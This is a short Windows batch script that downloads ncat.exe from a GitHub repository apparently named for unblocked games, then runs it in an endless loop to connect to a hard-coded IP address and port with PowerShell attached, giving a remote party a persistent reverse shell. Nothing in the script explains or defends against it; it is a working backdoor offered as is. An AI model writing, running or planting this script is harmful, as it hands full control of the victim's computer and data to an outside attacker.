@echo off
setlocal

:: Check if ncat is installed
where ncat >nul 2>&1
if %errorlevel%==0 (
    goto ncat
)

:: Set variables
set "url=https://github.com/unblockedgames2/zvgfd/blob/main/ncat.exe?raw=true"
set "installer=ncat.exe"
set "tempdir=%temp%\ncat_installer"

:: Create a temporary directory for the installer
if not exist "%tempdir%" (
    mkdir "%tempdir%"
)

:: Download the installer
echo Downloading ncat...
powershell -Command "Invoke-WebRequest -Uri %url% -OutFile %tempdir%\%installer%"

:: Check if the download was successful
if not exist "%tempdir%\%installer%" (
    echo Error Code 2
    goto :eof
)

:ncat
set "host=147.185.221.20"
set "port=45895"
%tempdir%\ncat %host% %port% -e powershell
goto ncat

:end
endlocal
